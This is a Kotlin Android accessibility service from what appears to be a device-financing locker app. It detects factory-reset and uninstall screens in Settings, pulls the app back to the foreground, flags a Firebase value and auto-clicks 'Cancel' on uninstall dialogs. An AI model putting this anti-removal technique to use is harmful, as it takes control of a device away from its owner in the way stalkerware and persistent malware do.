package com.app.emilockerapp.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.SystemClock
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.app.emilockerapp.uilayer.views.MainActivity
import com.app.emilockerapp.utils.getMyRef

/**
 * Accessibility service that detects:
 * 1) Factory Data Reset flow/taps inside Settings
 * 2) App Info screen + Uninstall button taps (and can auto-cancel confirmation)
 *
 * Make sure your res/xml/a11y_settings_watch.xml includes at least:
 *   typeViewClicked|typeWindowStateChanged|typeWindowContentChanged
 * and canRetrieveWindowContent="true"
 */
class SettingsWatchService : AccessibilityService() {

    companion object {
        private const val TAG = "SettingsWatch"

        private const val SETTINGS_PKG = "com.android.settings"

        // Some devices show the uninstall confirmation via a package installer dialog
        private val INSTALLER_PACKAGES = setOf(
            "com.google.android.packageinstaller",
            "com.android.packageinstaller",
            "com.android.settings" // some OEMs keep entire flow in Settings
        )

        // Factory reset screens/classes commonly seen (extend as you observe OEMs)
        private val POSSIBLE_RESET_CLASSES = setOf(
            "com.android.settings.MasterClear",
            "com.android.settings.MasterClearConfirm",
            "com.android.settings.Settings\$MasterClearActivity",
            "com.android.settings.Settings\$MasterClearConfirmActivity",
            "com.android.settings.factoryreset.FactoryResetActivity",
            "com.android.settings.SubSettings"
        )

        // App Info screens (varies by OEM/Android version)
        private val APP_INFO_CLASSES = setOf(
            "com.android.settings.applications.InstalledAppDetailsTop",
            "com.android.settings.applications.InstalledAppDetails",
            "com.android.settings.SubSettings"
        )

        // Texts we look for in nodes (extend/localize as needed)
        private val RESET_KEYWORDS = listOf(
            "Factory data reset", "Erase all data", "Reset options", "Delete all data",
            "ফ্যাক্টরি ডাটা রিসেট", "সমস্ত ডেটা মুছুন", "রিসেট অপশন",
            "factory reset", "master clear"
        )

        private val UNINSTALL_KEYWORDS = listOf(
            "uninstall", "uninstall app", "uninstall updates", "remove app", "disable",
            "আনইনস্টল", "অ্যাপ অপসারণ", "আনইনস্টল করুন"
        )

        private val CANCEL_KEYWORDS = listOf("cancel", "বাতিল", "ক্যানসেল", "না")
    }

    // Prevents spamming re-launch
    private var lastBringToFrontAt = 0L
    private fun bringAppToFrontThrottled() {
        val now = SystemClock.uptimeMillis()
        if (now - lastBringToFrontAt < 1200) return
        lastBringToFrontAt = now
        bringAppToFront()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        // Programmatic config (helps ensure we actually receive the events we need)
        val info = serviceInfo ?: AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = info.flags or
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
        info.notificationTimeout = 50
        // info.packageNames = null // listen to all packages
        serviceInfo = info
        Log.i(TAG, "onServiceConnected() configured")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString().orEmpty()
        val cls = event.className?.toString().orEmpty()

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // Factory reset entry
                if (pkg == SETTINGS_PKG &&
                    (cls in POSSIBLE_RESET_CLASSES || cls.contains("MasterClear", true))
                ) {
                    Log.i(TAG, "Entered Factory Reset screen: $cls")
                    notifyEnteredResetFlow(cls)
                    onFactoryResetTapped()
                }

                // App Info opened
                if (pkg == SETTINGS_PKG && cls in APP_INFO_CLASSES) {
                    Log.d(TAG, "App Info opened: $cls")
                    sendBroadcast(Intent("com.app.emilockerapp.APP_INFO_OPENED").setPackage(packageName))
                    //onUninstallTapped()
                }

                // Uninstall confirmation dialog tends to be a new window in installer pkg
                if (pkg in INSTALLER_PACKAGES) {
                    tryCancelUninstallDialog() // optional, kiosk-style behavior
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                // Factory reset button taps
                if (pkg == SETTINGS_PKG && looksLikeFactoryResetClick(event)) {
                    Log.i(TAG, "Factory Reset control tapped.")
                    onFactoryResetTapped()
                }

                // Uninstall button taps on App Info
                if (pkg == SETTINGS_PKG && looksLikeUninstallClick(event)) {
                    Log.i(TAG, "Uninstall tapped.")
                    onUninstallTapped()
                }
            }

            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Optional: detect presence of reset UI as user navigates
                if (pkg == SETTINGS_PKG) {
                    rootInActiveWindow?.let { root ->
                        if (treeContainsResetUI(root)) {
                            onUninstallTapped()
                            Log.d(TAG, "Reset UI visible in current window.")
                        }
                    }
                }
            }
        }
    }

    // ---------------- Factory reset helpers ----------------

    private fun looksLikeFactoryResetClick(event: AccessibilityEvent): Boolean {
        val t = (event.text ?: emptyList()).joinToString(" ").lowercase()
        val d = event.contentDescription?.toString()?.lowercase().orEmpty()
        if (RESET_KEYWORDS.any { t.contains(it.lowercase()) || d.contains(it.lowercase()) }) return true

        val node = event.source ?: return false
        return nodeOrParentsContain(node, RESET_KEYWORDS) ||
                nodeOrParentsIdContains(node, listOf("reset", "erase", "master_clear", "factory_reset"))
    }

    private fun treeContainsResetUI(root: AccessibilityNodeInfo): Boolean {
        val q = ArrayDeque<AccessibilityNodeInfo?>()
        q.add(root)
        while (q.isNotEmpty()) {
            val n = q.removeFirst() ?: continue
            val txt = (n.text?.toString() ?: "") + " " + (n.contentDescription?.toString() ?: "")
            val id = n.viewIdResourceName ?: ""
            if (RESET_KEYWORDS.any { kw -> txt.contains(kw, true) } ||
                id.contains("master_clear", true) ||
                id.contains("factory_reset", true) ||
                id.contains("erase", true)
            ) return true
            for (i in 0 until n.childCount) q.add(n.getChild(i))
        }
        return false
    }

    private fun notifyEnteredResetFlow(className: String) {
        sendBroadcast(
            Intent("com.app.emilockerapp.RESET_FLOW_ENTERED")
                .putExtra("cls", className)
                .setPackage(packageName)
        )
        bringAppToFrontThrottled()
    }

    private fun onFactoryResetTapped() {
        sendBroadcast(Intent("com.app.emilockerapp.FACTORY_RESET_TAPPED").setPackage(packageName))
        bringAppToFrontThrottled()
        // Your existing Firebase flag
        getMyRef(this).setValue(true)
    }

    // ---------------- Uninstall helpers ----------------

    private fun looksLikeUninstallClick(event: AccessibilityEvent): Boolean {
        val t = (event.text ?: emptyList()).joinToString(" ").lowercase()
        val d = event.contentDescription?.toString()?.lowercase().orEmpty()
        if (UNINSTALL_KEYWORDS.any { t.contains(it) || d.contains(it) }) return true

        val node = event.source ?: return false
        if (nodeOrParentsContain(node, UNINSTALL_KEYWORDS)) return true
        return nodeOrParentsIdContains(node, listOf("uninstall", "remove", "disable"))
    }

    private fun onUninstallTapped() {
        sendBroadcast(Intent("com.app.emilockerapp.UNINSTALL_TAPPED").setPackage(packageName))
        bringAppToFrontThrottled()
        getMyRef(this).setValue(true)

        // Immediately attempt to cancel confirmation (optional)
        tryCancelUninstallDialog()
    }

    /**
     * Tries to auto-click "Cancel" on uninstall confirmation dialog.
     * Use only for legitimate kiosk flows.
     */
    private fun tryCancelUninstallDialog() {
        val root = rootInActiveWindow ?: return
        if (clickFirstNodeByText(root, CANCEL_KEYWORDS)) {
            Log.d(TAG, "Clicked CANCEL on uninstall dialog (by text).")
            return
        }
        if (clickFirstNodeByIdContains(root, listOf("button2", "cancel", "negative"))) {
            Log.d(TAG, "Clicked CANCEL on uninstall dialog (by id).")
        }
    }

    // ---------------- Node utilities ----------------

    private fun nodeOrParentsContain(node: AccessibilityNodeInfo?, keywords: List<String>): Boolean {
        var cur = node
        repeat(8) {
            if (cur == null) return false
            val txt = (cur!!.text?.toString() ?: "") + " " + (cur!!.contentDescription?.toString() ?: "")
            if (keywords.any { kw -> txt.contains(kw, ignoreCase = true) }) return true
            cur = cur!!.parent
        }
        return false
    }

    private fun nodeOrParentsIdContains(node: AccessibilityNodeInfo?, parts: List<String>): Boolean {
        var cur = node
        repeat(8) {
            if (cur == null) return false
            val id = cur!!.viewIdResourceName ?: ""
            if (parts.any { p -> id.contains(p, ignoreCase = true) }) return true
            cur = cur!!.parent
        }
        return false
    }

    private fun clickFirstNodeByText(root: AccessibilityNodeInfo, keys: List<String>): Boolean {
        val q = ArrayDeque<AccessibilityNodeInfo?>()
        q.add(root)
        while (q.isNotEmpty()) {
            val n = q.removeFirst() ?: continue
            val txt = (n.text?.toString() ?: "") + " " + (n.contentDescription?.toString() ?: "")
            if (keys.any { k -> txt.contains(k, ignoreCase = true) }) {
                if (n.isClickable) return n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                var p = n
                repeat(6) {
                    p = p.parent ?: return@repeat
                    if (p.isClickable) return p.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
            }
            for (i in 0 until n.childCount) q.add(n.getChild(i))
        }
        return false
    }

    private fun clickFirstNodeByIdContains(root: AccessibilityNodeInfo, parts: List<String>): Boolean {
        val q = ArrayDeque<AccessibilityNodeInfo?>()
        q.add(root)
        while (q.isNotEmpty()) {
            val n = q.removeFirst() ?: continue
            val id = n.viewIdResourceName ?: ""
            if (parts.any { p -> id.contains(p, ignoreCase = true) }) {
                if (n.isClickable) return n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                var p = n
                repeat(6) {
                    p = p.parent ?: return@repeat
                    if (p.isClickable) return p.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
            }
            for (i in 0 until n.childCount) q.add(n.getChild(i))
        }
        return false
    }

    // ---------------- App bring-to-front ----------------

    private fun bringAppToFront() {
        val launchIntent = Intent(this, MainActivity::class.java).apply {
            addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP
            )
        }
        startActivity(launchIntent)
    }

    override fun onInterrupt() {}
}
